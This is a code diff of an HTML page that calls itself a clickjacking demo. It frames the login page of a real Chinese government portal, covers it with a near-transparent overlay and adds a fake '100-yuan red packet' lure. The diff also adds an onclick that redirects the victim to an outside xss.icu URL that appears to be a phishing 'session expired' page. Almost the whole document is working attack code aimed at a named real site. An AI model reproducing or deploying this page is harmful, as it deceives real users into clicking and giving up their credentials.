@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>点击劫持演示（登录页-20%透明版）</title>
+    <title>点击劫持演示（登录页-20%透明+跳转版）</title>
     <style>
         body {
             margin: 0;
@@ -10,7 +10,7 @@
             height: 100vh;
             overflow: hidden;
         }
-        /* 目标登录页 */
+        /* 目标页面 */
         iframe {
             position: absolute;
             top: 0;
@@ -20,14 +20,14 @@
             border: none;
             z-index: 1;
         }
-        /* 前景遮罩：20%透明（能清晰看到背景） */
+        /* 前景20%透明遮罩 */
         .mask {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.2); /* 20%透明，不影响背景可见度 */
+            background: rgba(255, 255, 255, 0.2);
             z-index: 2;
             display: flex;
             align-items: center;
@@ -61,11 +61,11 @@
 </head>
 <body>
     <!-- 目标登录页 -->
-    <iframe src="https://ywt.scjgj.cq.gov.cn/"></iframe>
+    <iframe src="https://ywt.scjgj.cq.gov.cn/login"></iframe>
 
     <!-- 20%透明遮罩+红包诱导层 -->
     <div class="mask">
-        <div class="red-packet">
+        <div class="red-packet" onclick="window.location.href='https://xss.icu/ph/82954c7be347/session_expired_iframe?v=3uh9nou2'">
             <div class="title">百元红包</div>
             <div class="desc">点击立即领取</div>
         </div>
